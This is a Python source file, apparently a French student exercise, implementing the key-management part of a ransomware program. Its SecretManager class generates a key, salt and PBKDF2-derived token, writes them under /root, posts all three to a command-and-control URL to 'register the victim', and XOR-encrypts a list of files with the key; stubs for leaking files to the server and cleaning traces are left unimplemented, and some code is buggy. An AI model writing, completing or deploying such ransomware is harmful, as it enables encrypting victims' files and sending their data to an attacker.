from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16
    CNC_URL = "http://cnc-server/new"

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:

        kdf = PBKDF2HMAC( algorithm = hashes.SHA256() , length=SecretManager.KEY_LENGTH , salt=salt ,  iterations=SecretManager.ITERATION,) #La fonction PBKDF2HMAC permet de crée la clé de dérivation

        DerivedKey = kdf.derive(key)  #On dérive la clé    

        return(DerivedKey) #On renvoi la clé dérivé
        
        
    def create(self)->Tuple[bytes, bytes, bytes]:

        salt=secrets.token_bytes(SecretManager.SALT_LENGTH)#On génère le sel aléatoirement à l'aide de la fonction secrets
        key=secrets.token_bytes(SecretManager.KEY_LENGTH)#On fait de meme que pour le sel
        token=self.do_derivation(salt,key)#On applique la derivation

        return(salt,key,token)#On renvoi les valeurs obtenues


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        # register the victim to the CNC
        requests.post(SecretManager.CNC_URL ,json= { "token" : self.bin_to_b64(token),"salt" : self.bin_to_b64(salt), "key" : self.bin_to_b64(key)}) #On utilise requests.post pour envoyer le JSON à la vicitme
 

    def setup(self)->None:
        # main function to create crypto data and register malware to cnc
        Token_path=os.path.join(self._path, "token.bin") #On ecrit les path de chaque valeurs
        Key_path=os.path.join(self._path, "Key.bin")
        Salt_path=os.path.join(self._path, "Salt.bin")

        
        salt, key, token = self.create()
        self._key = key
        self._token = token
        
        with open(Token_path, "w") as f: #On ecrit chaque valeur dans leur fichier éponyme
            f.write(token)
        f.close()

        with open(Key_path, "w") as f1:
            f1.write(key)
        f1.close()

        with open(Salt_path, "w") as f1:
            f1.write(salt)
        f1.close()


        self.post_new(salt, key, token) #On envoi les valeurs au CNC
        self.load()

    def load(self)->None:
        # function to load crypto data
        raise NotImplemented()

    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        raise NotImplemented()

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        raise NotImplemented()

    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        token_hash= sha256(self._token).hexdigest()
        return(token_hash)

    def xorfiles(self, files:List[str])->bytes:
        # xor a list for file
        xorfile(files,self._key)

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target
        raise NotImplemented()